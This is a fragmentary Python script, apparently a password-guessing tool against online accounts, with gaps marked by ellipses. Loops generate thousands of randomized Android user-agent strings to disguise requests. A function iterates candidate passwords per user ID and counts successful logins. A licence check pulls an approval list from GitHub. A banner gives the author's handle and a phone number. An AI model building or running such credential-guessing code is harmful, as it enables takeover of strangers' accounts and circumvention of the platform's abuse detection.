...
for xd in range(10000):
		...
		c='SM-M526B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
		d=random.randrange(92,115)
		e='0'
		f=random.randrange(4200,6000)
		g=random.randrange(60,192)
...
for xd in range(10000):
		a='Mozilla/5.0 (Linux; Android'
		b=random.choice(['6','7','8','9','10','11','12','13'])
		c='SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
		d=random.randrange(92,115)
		e='0'
		f=random.randrange(4200,6000)
		g=random.randrange(60,192)
...
for xd in range(10000):
		a='Mozilla/5.0 (Linux; Android'
		b=random.choice(['6','7','8','9','10','11','12','13'])
		c='SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
		d=random.randrange(92,115)
		e='0'
		f=random.randrange(4200,6000)
		g=random.randrange(60,192)
...
for xd in range(10000):
		a='Mozilla/5.0 (Linux; Android'
		b=random.choice(['6','7','8','9','10','11','12','13'])
		c='SM-M045F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
		d=random.randrange(92,115)
		e='0'
		f=random.randrange(4200,6000)
		g=random.randrange(60,192)
...
for xd in range(10000):
		a='Mozilla/5.0 (Linux; Android'
		b=random.choice(['6','7','8','9','10','11','12','13'])
		c='RMP2107 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
		d=random.randrange(92,115)
		e='0'
		f=random.randrange(4200,6000)
		g=random.randrange(60,192)
...
logo=("""
\033[1;91m    __  ____ __  __  ________  ___
\033[1;92m   / / / / // / /  |/  <  /  |/  /
\033[1;93m  / /_/ / // /_/ /|_/ // / /|_/ / 
\033[1;94m / __  /__  __/ /  / // / /  / /  
...
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mHAMIM  \033[38;5;46m           │
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m HAMIM-404      \033[38;5;46m  │ 
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01627276294       \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mHAMIM          \033[38;5;46m   │
\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/Mr-HAMIM-404');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mHAMIM-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
  		  ...
  		  'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5639.219", "Google Chrome";v="114.0.5639.219"',
  		  'sec-ch-ua-mobile': '?0',
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/HAMIM-404/HAMIM-2/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        os.system("xdg-open https://wa.me/+8801627276294")
        superuser()        
superuser()
